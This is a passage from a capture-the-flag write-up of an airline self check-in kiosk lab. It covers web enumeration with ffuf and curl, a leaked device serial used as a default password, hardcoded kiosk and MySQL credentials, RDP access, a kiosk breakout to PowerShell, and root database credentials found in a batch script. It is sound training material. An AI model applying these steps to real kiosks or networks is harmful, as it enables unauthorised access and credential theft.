2. Web Portal & API Enumeration

Navigating to http://10.129.91.231:8443/login presented a login portal for Nexion DocReader (DeviceHub DH-100 — Gate B7). Inspecting the page source revealed a tooltip hint on the "Forgot your password?" link:

<div class="login-hint" title="The default password is the device serial number included in your DeviceHub packaging.">Forgot your password?</div>

Directory fuzzing with ffuf identified common endpoints:

ffuf -u http://10.129.91.231:8443/FUZZ -recursion -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0 -s

Discovered paths included /api, /login, and /favicon.ico.

Querying the unauthenticated /api/status endpoint leaked the device serial number:

curl -s http://10.129.91.231:8443/api/status

  "device": "Nexion DeviceHub DH-100",
  "serial": "NX-DH-2024-B7042",

Additional asset review and testing the badge verification route:

curl -s -X POST http://10.129.91.231:8443/login/badge

3. Credential Harvesting & Peripheral Control

Authenticating to /login using the serial NX-DH-2024-B7042 provided access to the Nexion DeviceHub Dashboard. The device cards displayed hardcoded credentials for peripheral modules:

  • Username: KioskUser
  • Password: K!0sk2026#

Under the Passport Scanner (Nexion DocReader SR-4200) settings, clicking Power Off set the scanner status to OFFLINE. Disabling this device forced the kiosk software to throw hardware errors and display troubleshooting links.

4. RDP Initial Access & Kiosk Breakout

An interactive RDP session was established with the recovered kiosk account:

xfreerdp /v:10.129.91.231 /u:KioskUser /p:'K!0sk2026#' /cert:ignore

The session spawned inside the locked-down HTB Airways Self Check-In interface. To escape the sandbox:

  1. With the scanner offline, clicking the troubleshooting help link directed to https://support.nexionsystems.com/docreader/troubleshoot, opening Microsoft Edge.
  2. Used the browser's download and file open dialogues to spawn standard Windows File Explorer.
  3. Navigated to the Windows system binary directory to launch an interactive powershell.exe session.
  4. Retrieved the user flag from the KioskUser Desktop folder:
[REDACTED_USER_FLAG]

5. Local Enumeration & Internal Database Analysis

Inspecting the kiosk application backend codebase at C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts revealed internal fallback credentials:

const defaults = { 
  host: "127.0.0.1", 
  port: 3306, 
  user: "kiosk_app", 
  password: "K!0sk_R3pl1ca#DB", 
  database: "htb_airways" 
};

Local socket enumeration confirmed MySQL listening on port 3306:

netstat -ano | findstr :3306

Logging into MySQL as kiosk_app and querying the staff table extracted employee IDs, roles, and hex-encoded RFID badge authentication codes:

SELECT employee_id, email, auth_code, role, active FROM _htb_staff;

6. Privilege Escalation Vector: Cleartext Batch Script

Inspecting maintenance files under C:\ProgramData\HTB Airways\ identified a world-readable batch script, refresh-dates.bat:

C:\ProgramData\HTB Airways> cat .\refresh-dates.bat
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul

Using the exposed administrative credentials to authenticate to MySQL:

mysql.exe -u root -pHTB@irw4ys_DB!2026 -h 127.0.0.1 -P 3306

Verifying administrative privileges in MySQL:

mysql> SELECT user, host, File_priv FROM mysql.user WHERE user = 'root';
+------+-----------+-----------+
| user | host      | File_priv |
+------+-----------+-----------+
| root | localhost | Y         |
+------+-----------+-----------+

The root account has File_priv = Y, confirming global file read/write capabilities on the underlying host within configured database parameters.
